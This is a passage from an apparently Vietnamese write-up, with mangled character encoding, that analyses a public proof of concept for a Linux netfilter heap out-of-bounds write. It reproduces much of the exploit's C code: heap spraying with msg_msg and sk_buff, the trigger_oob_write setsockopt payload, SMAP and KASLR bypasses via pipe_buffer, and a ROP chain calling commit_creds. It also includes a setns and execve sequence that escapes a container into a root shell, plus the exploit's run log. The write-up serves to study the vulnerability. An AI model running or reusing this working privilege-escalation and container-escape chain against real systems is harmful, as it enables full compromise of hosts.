b·∫£n uaf th√¨ ch√∫ng ta ph·∫£i gi·∫£i ph√≥ng ƒë·ªëi t∆∞·ª£ng struct msg_msg, ƒëi·ªÅu n√†y ch·ªâ ƒë∆∞·ª£c th·ª±c hi·ªán n·∫øu hai ph·∫ßn t·ª≠ ƒë·∫ßu ti√™n c·ªßa con tr·ªè c√≥ th·ªÉ ghi ƒë∆∞·ª£c  T√¨m ƒë·ªëi t∆∞·ª£ng khai th√°c ƒê·ªëi t∆∞·ª£ng khai th√°c t·ªët nh·∫•t l√† ƒë·ªëi t∆∞·ª£ng c√≥ con tr·ªè h√†m trong c·∫•u tr√∫c n√†y. Victim ph·∫£i c·∫•p ph√°t v·ªõi GFP_KERNEL_ACCOUNt\n C·∫•u tr√∫c struct pipe_buffer ƒë∆∞·ª£c c·∫•p ph√°t tr√≤ng kmalloc-1024 (ƒë√¢y l√† l√≠ do t·∫°i sao mesage th·ª© 2 l√† 1024 bytes). C·∫•u tr√∫c struct pipe_buffer c√≥ th·ªÉ ƒë∆∞·ª£c c·∫•p ph√°t d·ªÖ d√†ng v·ªõi pipe() m√† c√≥ h√†m alloc_pipe_info() nh∆∞ m·ªôt ch∆∞∆°ng tr√¨nh con:  1 2 3 4 5 6 7 8 9 10 11 12 13 14  // https://git.kernel.org/pub/scm/linux/kernel/git/torvals/linux.git/tree/fs/pipe.c\rstruct pipe_inode_info *alloc_pipe_info(void)\r{\r...\runsigned long pipe_bufs = PIPE_DEF_BUFFERS;\r...\rpipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);\rif (pipe == NULL)\rgoto out_free_uid;\r...\rpipe-\u0026gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT);\r...\r}\r  N√≥ kh√¥ng tr·ª±c ti·∫øp ch·ª©a con tr·ªè h√†m, n√≥ ch·ª©a con tr·ªè t·ªõi c·∫•u tr√∫c struct pipe_buf_operations m√† c·∫•u tr√∫c n√†y l·∫°i c√≥ con tr·ªè h√†m m√† ch√∫ng ta c·∫ßn:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/pipe_fs_i.h\r\rstruct pipe_buffer{\rstruct page *page;\runsigned int offset, len;\rconst struct pipe_buf_operations *ops;\runsigned int flags;\runsigned long private;\r};\rstruct pipe_buf_operations {\r...\r/*\r* When The contents of this pipe buffer has been completely\r* consumed by a reader, -\u0026gt;release() is called.\r*/\rvoid (*release)(struct pipe_node_info *, struct pipe_buffer *);\r...\r};\r  Bypassing KASLR/SMEP Khi vi·∫øt v√†o pipes, c√¢u tr√∫c struct pipe_buffer b·ªã ghi ƒë√®, trong ƒë√≥ ops n√≥ tr·ªè t·ªõi m·ªôt c·∫•u tr√∫c tƒ©nh n·∫±m tr√™n .data segment: anon_pipe_buf_ops:\n1 2 3 4 5 6 7  // https://git.kernel.org/pub/scm/linux/kernel/git/tovalds/linux.git/tree/fs/pipe.c\r static const struct pipe_buf_operations alloc_pipe_buf_ops = {\r.release = anon_pipe_buf_release,\r.try_steal = anon_pipe_buf_try_steal,\r.get = generic_pipe_buf_get,\r};\r  V√¨ kho·∫£ng c√°ch gi·ªØa ƒë·ªãa ch·ªâ c·ªßa .data segment v√† .text kh√¥ng ƒë·ªïi, n√™n ta t√≠nh ƒë∆∞·ª£c ƒë·ªãa ch·ªâ c·ªßa kernel_base_addr t·ª´ anon_pipe_buf_ops.\nT√≠nh nh∆∞ th·∫ø n√†o? M√¥ t·∫£ ·ªü ph·∫ßn POC\r\n  Phun nhi·ªÅu c·∫•u tr√∫c struct pipe_buffer v√† ch·ªânh s·ª≠a l·∫°i v·ªã tyris c·ªßa c·∫•u tr√∫c struct sk_buff c·ªßa data buffer.   Ch√∫ng ta ƒë·ªçc d·ªØ li·ªáu t·ª´ sk_buff ƒë·ªÉ leak n·ªôi d·ª•ng c·ªßa struct pipe_buffer v√† l·∫•y ƒë·∫°i ch·ªâ c·ªßa anon_pipe_buf_ops\n  V·ªõi th√¥ng tin n√†y, ch√∫ng ta s·∫Ω t√¨m JOP/ROP gadgets. Khi ƒë·ªçc t·ª´ unix socket, ch√∫ng ta c·∫ßn gi·∫£i ph√≥ng v√πng nh·ªõ c·ªßa n√≥.\n  N√¢ng quy·ªÅn  T·∫°o m·ªôt c·∫•u tr√∫c struct pipe_buffer v·ªõi m·ªô con tr·ªè ops tr·ªè t·ªõi m·ªôt c·∫•u tr√∫c struct pipe_buf_operations. C·∫•u tr√∫c n√†y ƒë·∫∑t t·∫°i c√πng ƒë·ªãa ƒëi·ªÉm v√¨ ch√∫ng ta bi·∫øt ƒë·ªãa ch·ªâ c·ªßa n√≥, ch·ª©a h√†m m√† ch√∫ng ta mu·ªën th·ª±c thi khi ƒë∆∞·ª£c gi·∫£i ph√≥ng.\n Cu·ªëi c√πng, ƒë√≥ng h·∫øt t·∫•t c·∫£ c√°c pipes =\u0026gt; k√≠ch ho·∫°t gi·∫£i ph√≥ng v√πng nh·ªõ =\u0026gt; k√≠ch ho·∫°t JOP chain.  Kernel ROP chain  L∆∞u ƒë·ªãa ch·ªâ c·ªßa RBP t·∫°i m·ªôt s√≥ ƒë·ªãa ch·ªâ trong kernel ƒë·ªÉ s·ª≠ d·ª•ng khi th·ª±c thi\n=\u0026gt; g·ªçi commit_creds(prepare_kernel_cred(NULL)) ƒë·ªÉ install kernel credentials\n=\u0026gt; g·ªçi switch_task_namespace(find_task_by_vpid(1), init_nsproxy) ƒë·ªÉ chuy·ªÉn kh√¥ng gian t√™n c·ªßa ti·∫øn tr√¨nh 1 t·ªõi 1 trong nh·ªØng ti·∫øn tr√¨nh kh·ªüi t·∫°o.\n=\u0026gt; kh√¥ ph·ª•c gi√° tr·ªã c·ªßa RBP v√† tr·∫£ v·ªÅ th·ª±c thi ƒë√£ d·ª´ng (free_pipe_info() tr·∫£ v·ªÅ).  Tho√°t container v√† nh·∫£y v√†o root shell 1 2 3 4 5 6  setns(open(\u0026#34;/proc/1/ns/mnt\u0026#34;, O_RDONLY), 0);\rsetns(open(\u0026#34;/proc/1/ns/pid\u0026#34;, O_RDONLY), 0);\rsetns(open(\u0026#34;/proc/1/ns/net\u0026#34;, O_RDONLY), 0);\rchar *args[] = {\u0026#34;/bin/bash\u0026#34;, \u0026#34;-i\u0026#34;, NULL};\rexecve(args[0], args, NULL);\r  Ph√¢n t√≠ch POC Ti·∫øp theo, ch√∫ng ta s·∫Ω ƒëi ph√¢n t√≠ch poc c·ªßa Andy Nguyen\nNh∆∞ demo, poc c·ªßa anh Any Nguyen cho th·∫•y r·∫•t r√µ c√°c b∆∞·ªõc ƒë·ªÉ khai th√°c t·ª´ vi·ªác kh·ªüi t·∫°o ·ªü STAGE0 ƒë·∫øn l√†m tr√†n b·ªô nh·ªõ ·ªü STAGE1, v∆∞·ª£t qua SMAP, KSALR, th·ª±c thi m√£ khai th√°c v√† tho√°t kh·ªèi container.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  [+] Linux Privilege Escalation by theflow@ - 2021\r[+] STAGE 0: Initialization\r[*] Setting up namespace sandbox...\r[*] Initializing sockets and message queues...\r[+] STAGE 1: Memory corruption\r[*] Spraying primary messages...\r[*] Spraying secondary messages...\r[*] Creating holes in primary messages...\r[*] Triggering out-of-bounds write...\r[*] Searching for corrupted primary message...\r[+] fake_idx: ffc\r[+] real_idx: fc4\r[+] STAGE 2: SMAP bypass\r[*] Freeing real secondary message...\r[*] Spraying fake secondary messages...\r[*] Leaking adjacent secondary message...\r[+] kheap_addr: ffff91a49cb7f000\r[*] Freeing fake secondary messages...\r[*] Spraying fake secondary messages...\r[*] Leaking primary message...\r[+] kheap_addr: ffff91a49c7a0000\r[+] STAGE 3: KASLR bypass\r[*] Freeing fake secondary messages...\r[*] Spraying fake secondary messages...\r[*] Freeing sk_buff data buffer...\r[*] Spraying pipe_buffer objects...\r[*] Leaking and freeing pipe_buffer object...\r[+] anon_pipe_buf_ops: ffffffffa1e78380\r[+] kbase_addr: ffffffffa0e00000\r[+] STAGE 4: Kernel code execution\r[*] Spraying fake pipe_buffer objects...\r[*] Releasing pipe_buffer objects...\r[*] Checking for root...\r[+] Root privileges gained.\r[+] STAGE 5: Post-exploitation\r[*] Escaping container...\r[*] Cleaning up...\r[*] Popping root shell...\r  STAGE0 - Kh·ªüi t·∫°o 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  printf(\u0026#34;[+] STAGE 0: Initialization\\n\u0026#34;);\rprintf(\u0026#34;[*] Setting up namespace sandbox...\\n\u0026#34;);\rif (setup_sandbox() \u0026lt; 0)\rgoto err_no_rmid;\rprintf(\u0026#34;[*] Initializing sockets and message queues...\\n\u0026#34;);\rif ((s = socket(AF_INET, SOCK_STREAM, 0)) \u0026lt; 0) {\rperror(\u0026#34;[-] socket\u0026#34;);\rgoto err_no_rmid;\r}\rfor (int i = 0; i \u0026lt; NUM_SOCKETS; i++) {\rif (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) \u0026lt; 0) {\rperror(\u0026#34;[-] socketpair\u0026#34;);\rgoto err_no_rmid;\r}\r}\rfor (int i = 0; i \u0026lt; NUM_MSQIDS; i++) {\rif ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) \u0026lt; 0) {\rperror(\u0026#34;[-] msgget\u0026#34;);\rgoto err_no_rmid;\r}\r}\rprintf(\u0026#34;\\n\u0026#34;);\r  msqid stand for: Message queue identifier,\r  H√†m setup_sandbox() c√≥ t√°c thi·∫øt l·∫≠p gi·ªõi h·∫°n c·ªßa CPU (d√≤ng 11-17) nh·∫±m m·ª•c ƒë√≠ch ph·ª•c c√≥ qu√° tr√¨nh spray c√°c message.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  int setup_sandbox(void) {\rif (unshare(CLONE_NEWUSER) \u0026lt; 0) {\rperror(\u0026#34;[-] unshare(CLONE_NEWUSER)\u0026#34;);\rreturn -1;\r}\rif (unshare(CLONE_NEWNET) \u0026lt; 0) {\rperror(\u0026#34;[-] unshare(CLONE_NEWNET)\u0026#34;);\rreturn -1;\r}\rcpu_set_t set;\rCPU_ZERO(\u0026amp;set);\rCPU_SET(0, \u0026amp;set);\rif (sched_setaffinity(getpid(), sizeof(set), \u0026amp;set) \u0026lt; 0) {\rperror(\u0026#34;[-] sched_setaffinity\u0026#34;);\rreturn -1;\r}\rreturn 0;\r}\r  L∆∞u √Ω, h√†m unshare ·ªü d√≤ng 2 v√† 6 c√≥ th·ªÉ b·ªã ch·∫∑n b·ªüi c∆° ch·∫ø Seccomp tr√™n docker. Khi ƒë√≥, ho·∫∑c b·∫°n c√≥ th·ªÉ kh√¥ng g·ªçi hai l·ªánh n√†y, ho·∫∑c b·∫°n c√≥ th·ªÉ ch·∫°y docker v·ªõi t√πy ch·ªçn --security-opt seccomp=unconfined:\n1 2 3  docker run --rm -it --security-opt seccomp=unconfined debian:jessie \\\r unshare --map-root-user --user sh -c whoami\r   Sau ƒë√≥, ch√∫ng ta kh·ªüi t·∫°o socket, t·∫°o socketpair (d√≤ng 14-19) v√† d√πng h√†m msgget() ƒë·ªÉ t·∫°o h√†ng ƒë·ª£i messages (d√≤ng 21-26)  STAGE1 - L√†m tr√†n b·ªô nh·ªõ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62  printf(\u0026#34;[+] STAGE 1: Memory corruption\\n\u0026#34;);\rprintf(\u0026#34;[*] Spraying primary messages...\\n\u0026#34;);\rfor (int i = 0; i \u0026lt; NUM_MSQIDS; i++) {\rmemset(\u0026amp;msg_primary, 0, sizeof(msg_primary));\r*(int *)\u0026amp;msg_primary.mtext[0] = MSG_TAG;\r*(int *)\u0026amp;msg_primary.mtext[4] = i;\rif (write_msg(msqid[i], \u0026amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) \u0026lt;\r0)\rgoto err_rmid;\r}\rprintf(\u0026#34;[*] Spraying secondary messages...\\n\u0026#34;);\rfor (int i = 0; i \u0026lt; NUM_MSQIDS; i++) {\rmemset(\u0026amp;msg_secondary, 0, sizeof(msg_secondary));\r*(int *)\u0026amp;msg_secondary.mtext[0] = MSG_TAG;\r*(int *)\u0026amp;msg_secondary.mtext[4] = i;\rif (write_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary),\rMTYPE_SECONDARY) \u0026lt; 0)\rgoto err_rmid;\r}\rprintf(\u0026#34;[*] Creating holes in primary messages...\\n\u0026#34;);\rfor (int i = HOLE_STEP; i \u0026lt; NUM_MSQIDS; i += HOLE_STEP) {\rif (read_msg(msqid[i], \u0026amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) \u0026lt;\r0)\rgoto err_rmid;\r}\rprintf(\u0026#34;[*] Triggering out-of-bounds write...\\n\u0026#34;);\rif (trigger_oob_write(s) \u0026lt; 0)\rgoto err_rmid;\rprintf(\u0026#34;[*] Searching for corrupted primary message...\\n\u0026#34;);\rfor (int i = 0; i \u0026lt; NUM_MSQIDS; i++) {\rif (i != 0 \u0026amp;\u0026amp; (i % HOLE_STEP) == 0)\rcontinue;\rif (peek_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), 1) \u0026lt; 0)\rgoto err_no_rmid;\rif (*(int *)\u0026amp;msg_secondary.mtext[0] != MSG_TAG) {\rprintf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;);\rgoto err_no_rmid;\r}\rif (*(int *)\u0026amp;msg_secondary.mtext[4] != i) {\rfake_idx = i;\rreal_idx = *(int *)\u0026amp;msg_secondary.mtext[4];\rbreak;\r}\r}\rif (fake_idx == -1 \u0026amp;\u0026amp; real_idx == -1) {\rprintf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;);\rgoto err_no_rmid;\r}\r// fake_idx\u0026#39;s primary message has a corrupted next pointer; wrongly\r // pointing to real_idx\u0026#39;s secondary message.\r printf(\u0026#34;[+] fake_idx: %x\\n\u0026#34;, fake_idx);\rprintf(\u0026#34;[+] real_idx: %x\\n\u0026#34;, real_idx);\rprintf(\u0026#34;\\n\u0026#34;);\r  Spraying primary messages  C·∫•u tr√∫c c·ªßa primary messages ƒë∆∞·ª£c x√¢y d·ª±ng:  1 2 3 4 5  struct {\rlong mtype;\rchar mtext[PRIMARY_SIZE - MSG_MSG_SIZE];\r} msg_primary;\r  v·ªõi MSG_MSG_SIZE l√† k√≠ch th∆∞·ªõc c·ªßa c·∫•u tr√∫c msg_msg:\n1 2 3 4 5 6 7 8 9 10 11  #define MSG_MSG_SIZE (sizeof(struct msg_msg))\r\rstruct msg_msg {\ruint64_t m_list_next;\ruint64_t m_list_prev;\ruint64_t m_type;\ruint64_t m_ts;\ruint64_t next;\ruint64_t security;\r};\r   H√†m write_msg:  1 2 3 4 5 6 7 8 9  int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) {\r*(long *)msgp = msgtyp;\rif (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) \u0026lt; 0) {\rperror(\u0026#34;[-] msgsnd\u0026#34;);\rreturn -1;\r}\rreturn 0;\r}\r  H√†m n√†y g·ªçi msgsnd ƒë·ªÉ g·ª≠i nh·ªØng message c√≥ k√≠ch th∆∞·ªõc l√† 4096. C·∫•u tr√∫c msg_primary b·∫Øt ngu·ªìn t·ª´ l·ªánh n√†y\nTham s·ªë th·ª© ba ƒë∆∞·ª£c truy·ªÅn l√† msgsz - sizeof(long) v√¨ tham s·ªë n√†y l·∫•y k√≠ch th∆∞·ªõc c·ªßa ph·∫ßn mtext, n√™n ch√∫ng ta l·∫•y k√≠ch th∆∞·ªõc c·ªßa c·∫£ c·∫•u tr√∫c msg_primary tr·ª´ cho k√≠ch th∆∞·ªõc c·ªßa mtype.\nƒê·ªÉ hi·ªÉu chi ti·∫øt h∆°n, b·∫°n c√≥ th·ªÉ ƒë·ªçc ·ªü ƒë√¢y .\n d√≤ng 6-7 d√πng v·ªõi m·ª•c ƒë√≠ch ki·ªÉm tra double reference ·ªü c√°c b∆∞·ªõc sau.  Spraying second messages 1 2 3 4 5 6 7 8 9 10  printf(\u0026#34;[*] Spraying secondary messages...\\n\u0026#34;);\rfor (int i = 0; i \u0026lt; NUM_MSQIDS; i++) {\rmemset(\u0026amp;msg_secondary, 0, sizeof(msg_secondary));\r*(int *)\u0026amp;msg_secondary.mtext[0] = MSG_TAG;\r*(int *)\u0026amp;msg_secondary.mtext[4] = i;\rif (write_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary),\rMTYPE_SECONDARY) \u0026lt; 0)\rgoto err_rmid;\r}\r   T·∫°o secondary message t∆∞∆°ng t·ª± v·ªõi t·∫°o primary messages, ch·ªâ kh√°c l√† k√≠ch th∆∞·ªõc c·ªßa msg_secondary l√∫c n√†y l√† 1024 thay v√¨ 4096, do ƒë√≥, c·∫•u tr√∫c c·ªßa msg_secondary s·∫Ω l√†:  1 2 3 4 5  struct {\rlong mtype;\rchar mtext[SECONDARY_SIZE - MSG_MSG_SIZE];\r} msg_secondary;\r  V·ªõi SECONDARY_SIZE = 1024.\nCreating holes in primary messages 1 2 3 4 5 6 7  printf(\u0026#34;[*] Creating holes in primary messages...\\n\u0026#34;);\rfor (int i = HOLE_STEP; i \u0026lt; NUM_MSQIDS; i += HOLE_STEP) {\rif (read_msg(msqid[i], \u0026amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) \u0026lt;\r0)\rgoto err_rmid;\r}\r   D√πng v√≤ng for ƒë·ªÉ gi·∫£i ph√≥ng c√°c primary message v·ªõi HOLE_STEP = 1024 v√† NUM_MSQIDS = 4096. H√†m read_msg ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a nh∆∞ sau:  1 2 3 4 5 6 7 8  int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {\rif (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) \u0026lt; 0) {\rperror(\u0026#34;[-] msgrcv\u0026#34;);\rreturn -1;\r}\rreturn 0;\r}\r  D·ªÖ th·∫•y, read_msg v√† write_msg l√† m·ªôt c·∫∑p h√†m g·ªçi t∆∞∆°ng ·ª©ng c√°c l·ªánh msgsnd v√† msgrcv ƒë·ªÉ g·ª≠i v√† nh·∫≠n c√°c messages. V·ªõi msgrcv, sau khi nh·∫≠n xong, n√≥ s·∫Ω gi·∫£i ph√≥ng v√πng nh·ªõ ƒë∆∞·ª£c nh·∫≠n, do ƒë√≥, n√≥ s·∫Ω t·∫°o ra c√°c l·ªó h·ªïng c√≥ k√≠ch th∆∞·ªõc b·∫±ng 1024 trong c√°c primary message.\nTriggering out-of-bounds write\u0026hellip; 1 2 3 4  printf(\u0026#34;[*] Triggering out-of-bounds write...\\n\u0026#34;);\rif (trigger_oob_write(s) \u0026lt; 0)\rgoto err_rmid;\r  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  int trigger_oob_write(int s) {\rstruct __attribute__((__packed__)) {\rstruct ipt_replace replace;\rstruct ipt_entry entry;\rstruct xt_entry_match match;\rchar pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];\rstruct xt_entry_target target;\r} data = {0};\rdata.replace.num_counters = 1;\rdata.replace.num_entries = 1;\rdata.replace.size = (sizeof(data.entry) + sizeof(data.match) +\rsizeof(data.pad) + sizeof(data.target));\rdata.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +\rsizeof(data.pad) + sizeof(data.target));\rdata.entry.target_offset =\r(sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));\rdata.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));\rstrcpy(data.match.u.user.name, \u0026#34;icmp\u0026#34;);\rdata.match.u.user.revision = 0;\rdata.target.u.user.target_size = sizeof(data.target);\rstrcpy(data.target.u.user.name, \u0026#34;NFQUEUE\u0026#34;);\rdata.target.u.user.revision = 1;\r// Partially overwrite the adjacent buffer with 2 bytes of zero.\r if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, \u0026amp;data, sizeof(data)) != 0) {\rif (errno == ENOPROTOOPT) {\rprintf(\u0026#34;[-] Error ip_tables module is not loaded.\\n\u0026#34;);\rreturn -1;\r}\r}\rreturn 0;\r}\r   H√†m trigger_oob_write m·ª•c ƒë√≠ch l√† k√≠ch ho·∫°t l·ªói heap out-of-bound ƒë∆∞·ª£c ƒë·ªÉ c·∫≠p ·ªü tr√™n. H√†m setsockopt ƒë∆∞·ª£c g·ªçi l√† d√≤ng 29 c√≥ optname l√† IPT_SO_SET_REPLACE k·∫øt h·ª£p v·ªõi t√πy ch·ªçn CAP_NET_ADMIN khi t·∫°o docker s·∫Ω k√≠ch ho·∫°t h√†m xt_compat_target_from_user() - h√†m ch·ª©a l·ªói heap-out-of-bound. D√≤ng 25 t√°c gi·∫£ s·ª≠ d·ª•ng c·∫•u tr√∫c NFQUEUE ƒë·ªÉ ki·ªÉm so√°t gi√° tr·ªã c·ªßa target-\u0026gt;targetsize. V·ªÅ c·∫•u tr√∫c c·ªßa data, t√¥i v·∫´n ch∆∞a th·ª±c s·ª± hi·ªÉu. ·ªû ƒë√¢y, t√°c gi·∫£ d√πng khai b√°o struct __attribute__((__packed__)) ƒë·ªÉ cho ph√©p c·∫•u tr√∫c c·ªßa data c√≥ k√≠ch th∆∞·ªõc nh·ªè h∆°n b·∫±ng b·∫±ng k√≠ch th∆∞·ªõc align (memory alignment); c√°c c·∫•u tr√∫c ipt_* l√† c√°c c·∫•u tr√∫c ƒë∆∞·ª£c s·ª≠ d·ª•ng trong netfilter v√† c√≥ m·ªëi quan h·ªá nh∆∞ h√¨nh b√™n:\n.  Searching for corrupted primary message 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  printf(\u0026#34;[*] Searching for corrupted primary message...\\n\u0026#34;);\rfor (int i = 0; i \u0026lt; NUM_MSQIDS; i++) {\rif (i != 0 \u0026amp;\u0026amp; (i % HOLE_STEP) == 0)\rcontinue;\rif (peek_msg(msqid[i], \u0026amp;msg_secondary, sizeof(msg_secondary), 1) \u0026lt; 0)\rgoto err_no_rmid;\rif (*(int *)\u0026amp;msg_secondary.mtext[0] != MSG_TAG) {\rprintf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;);\rgoto err_no_rmid;\r}\rif (*(int *)\u0026amp;msg_secondary.mtext[4] != i) {\rfake_idx = i;\rreal_idx = *(int *)\u0026amp;msg_secondary.mtext[4];\rbreak;\r}\r}\rif (fake_idx == -1 \u0026amp;\u0026amp; real_idx == -1) {\rprintf(\u0026#34;[-] Error could not corrupt any primary message.\\n\u0026#34;);\rgoto err_no_rmid;\r}\r// fake_idx\u0026#39;s primary message has a corrupted next pointer; wrongly\r // pointing to real_idx\u0026#39;s secondary message.\r printf(\u0026#34;[+] fake_idx: %x\\n\u0026#34;, fake_idx);\rprintf(\u0026#34;[+] real_idx: %x\\n\u0026#34;, real_idx);\r   D√πng v√≤ng for t·ª´ d√≤ng 2-10 ƒë·ªÉ ki·ªÉm tra t·∫•t c·∫£ c√°c message ƒë√£ ƒë∆∞·ª£c c·∫•p ph√°t H√†m peek_msg() ƒë·ªÉ ƒë·ªçc gi√° tr·ªã c·ªßa c√°c message v√† l∆∞u v√†o msg_secondary, ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a nh∆∞ sau:  1 2 3 4 5 6 7 8 9  int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {\rif (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) \u0026lt;\r0) {\rperror(\u0026#34;[-] msgrcv\u0026#34;);\rreturn -1;\r}\rreturn 0;\r}\r  Kh√° gi·ªëng v·ªõi h√†m read_msg ƒë·ªÅu g·ªçi h√†m msgrcv, ƒëi·ªÉm kh√°c bi·ªát duy nh·∫•t l√† msgflg c√≥ gi√° tr·ªã l√† MSG_COPY | IPC_NOWAIT\n D√≤ng 11-15 , d√πng gi√° tr·ªã c·ªßa msg_secondary.mtext[4] ƒë·ªÉ ki·ªÉm tra xem li·ªáu c√≥ xu·∫•t hi·ªán tr∆∞·ªùng h·ª£p 2 c·∫•u tr√∫c c√πng tham kh·∫£o ƒë·∫øn m·ªôt ƒë·ªãa ch·ªâ hay kh√¥ng. ·ªû b∆∞·ªõc kh·ªüi t·∫°o, ch√∫ng ta g√°n m·ªói gi√° tr·ªã msg_secondary.mtext[4] l√† m·ªôt gi√° tr·ªã ch·ªâ s·ªë i t∆∞∆°ng ·ª©ng, trong b∆∞·ªõc n√†y, n·∫øu t·ªìn t·∫°i m·ªôt message c√≥ msg_secondary.mtext[4] kh√°c v·ªõi ch·ªâ s·ªë t∆∞∆°ng ·ª©ng c·ªßa n√≥, ƒëi·ªÅu ƒë√≥ c√≥ nghƒ©a message n√†y ƒëang tr·ªè t·ªõi m·ªôt c·∫•u tr√∫c kh√°c tr√™n primary_message.  STAGE 2: SMAP bypass Freeing real secondary message\u0026hellip; 1 2 3 4 5  printf(\u0026#34;[*] Freeing real secondary message...\\n\u0026#34;);\rif (read_msg(msqid[real_idx], \u0026amp;msg_secondary, sizeof(msg_secondary),\rMTYPE_SECONDARY) \u0026lt; 0)\rgoto err_rmid;\r  Gi·ªëng nh∆∞ nh·ªØng stage tr∆∞·ªõc, ƒë·ªÉ gi·∫£i ph√≥ng c√°c messages ƒë√£ ƒë∆∞·ª£c c·∫•p ph√°t, ta d√πng l·ªánh read_msg ƒë·ªÉ ƒë·ªçc message r·ªìi gi·∫£i ph√≥ng v√πng nh·ªõ ƒë√≥.\nSpraying fake secondary messages\u0026hellip; 1 2 3 4 5 6  memset(secondary_buf, 0, sizeof(secondary_buf));\rbuild_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,\rPAGE_SIZE - MSG_MSG_SIZE, 0);\rif (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) \u0026lt; 0)\rgoto err_rmid;\r   Sau khi ƒë√£ gi·∫£i ph√≥ng message g·ªëc, ch√∫ng ta t·∫°o ra m·ªôt fake secondary message th√¥ng qua h√†m build_msg_msg:  1 2 3 4 5 6 7 8 9 10  void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,\ruint64_t m_list_prev, uint64_t m_ts, uint64_t next) {\rmsg-\u0026gt;m_list_next = m_list_next;\rmsg-\u0026gt;m_list_prev = m_list_prev;\rmsg-\u0026gt;m_type = MTYPE_FAKE;\rmsg-\u0026gt;m_ts = m_ts;\rmsg-\u0026gt;next = next;\rmsg-\u0026gt;security = 0;\r}\r   Ti·∫øn h√†nh spray c·∫•u tr√∫c skbuff b·∫±ng l·ªánh skbuff:  1 2 3 4 5 6 7 8 9 10 11  int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {\rfor (int i = 0; i \u0026lt; NUM_SOCKETS; i++) {\rfor (int j = 0; j \u0026lt; NUM_SKBUFFS; j++) {\rif (write(ss[i][0], buf, size) \u0026lt; 0) {\rperror(\u0026#34;[-] write\u0026#34;);\rreturn -1;\r}\r}\r}\rreturn 0;\r}\r  skbuff l√† m·ªôt nguy√™n li·ªáu tuy·ªát v·ªùi ƒë·ªÉ t·∫°o UAF, thao t√°c n√†y l√†m cho c·∫•u tr√∫c skbuf tr·ªè t·ªõi fake message c·ªßa ch√∫ng ta. Khi ch√∫ng ta gi·∫£i ph√≥ng fake message, c·∫•u tr√∫c sk_buff v·∫´n c√≤n v√† tr·ªè t·ªõi v·ªã tr√≠ fake_message c·ªßa m√¨nh.\nƒê·ªÉ th·ª±c hi·ªán spray, ta d√πng hai v√≤ng for, v√≤ng th·ª© nh·∫•t ƒëi qua t·∫•t c·∫£ c√°c c·∫∑p SOCKETS ƒë∆∞·ª£c kh·ªüi t·∫°o, v√≤ng th·ª© 2 ƒëi qua t·∫•t c·∫£ c√°c c·∫•u tr√∫c sk_buff ƒëang c√≥ tr√™n m·ªói c·∫∑p socket r·ªìi d√πng l·ªánh write ƒë·ªÉ c·∫•p ph√°t v√† ghi n·ªôi dung fake secondary message c·ªßa ch√∫ng ta.\nLeaking adjacent secondary message 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  // Use the fake secondary message to read out-of-bounds.\r printf(\u0026#34;[*] Leaking adjacent secondary message...\\n\u0026#34;);\rif (peek_msg(msqid[fake_idx], \u0026amp;msg_fake, sizeof(msg_fake), 1) \u0026lt; 0)\rgoto err_rmid;\r// Check if the leak is valid.\r if (*(int *)\u0026amp;msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) {\rprintf(\u0026#34;[-] Error could not leak adjacent secondary message.\\n\u0026#34;);\rgoto err_rmid;\r}\r// The secondary message contains a pointer to the primary message.\r msg = (struct msg_msg *)\u0026amp;msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];\rkheap_addr = msg-\u0026gt;m_list_next;\rif (kheap_addr \u0026amp; (PRIMARY_SIZE - 1))\rkheap_addr = msg-\u0026gt;m_list_prev;\rprintf(\u0026#34;[+] kheap_addr: %\u0026#34; PRIx64 \u0026#34;\\n\u0026#34;, kheap_addr);\rif ((kheap_addr 